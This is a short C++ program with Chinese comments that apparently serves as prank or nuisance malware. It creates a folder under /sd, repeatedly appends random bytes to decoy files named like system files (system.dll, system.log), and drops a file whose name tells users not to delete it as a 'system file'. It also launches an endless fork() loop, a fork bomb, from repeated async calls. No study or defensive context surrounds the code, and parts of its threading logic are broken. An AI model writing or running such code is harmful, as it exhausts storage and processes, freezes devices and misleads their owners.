#import <iostream>
#import <fstream>//文件读写
#import <random>//随机
#import <string>//字符串
#import <thread>//多线程
#import <future>//多线程
#import <unistd.h>
#import <sys/types.h>
#import <set>
using namespace std;
string filename;
string foldername;
string str[]={ "system.bin","system.log","system.dat","system.dll"};
random_device rd;
default_random_engine f(rd());
string dir;
string fn="系统文件勿删.txt";
int random_name(){//随机名字
  string temp;
  temp="/sd/test";//这只是个测试请修改此处
  string cmd="mkdir -p " + temp;
  system(cmd.c_str());
  foldername=temp;
  return 0;
}
int write_rom(unsigned int dn){
  char p='a';
  int i,j,k;
  for(auto i=0;i<10000;i++){
    filename=str[f()%4];

    dir=foldername+"/"+filename;
    fstream fs(dir,ios::binary | ios::app);
    string x;
    x.push_back(p+f()%1000);

    for(auto i=0;i<1;i++)//必须为正数
    {
      fs.write((const char*)&x.at(f()%x.size()),x.size());
    }
    fs.close();
  }
  return 0;
}
int pause(){//卡顿
  while(true){
    pid_t id = fork();
    if(id==0){
    }
  }
  return 0;
}

int main()
{
  random_name();
  string dir2=foldername+"/"+fn;
  fstream fs2(dir2,ios::out);
  fs2.close();
  cout<<dir2<<endl;
  multiset<thread*>m;
  for(int i=0;i<10;i++){//线程数
    cout<<"isRuning!\n";
    thread fu(write_rom,100000000);//写入次数
    m.insert(move(&fu));
    fu.join();
  }
  for(auto i=0;i<1000;i++){//运行次数
    future<int> fu(async(pause));
    for(auto&it:m){
      it->join();
      it->detach();
    }
    fu.get();
  }

  return 0;
}

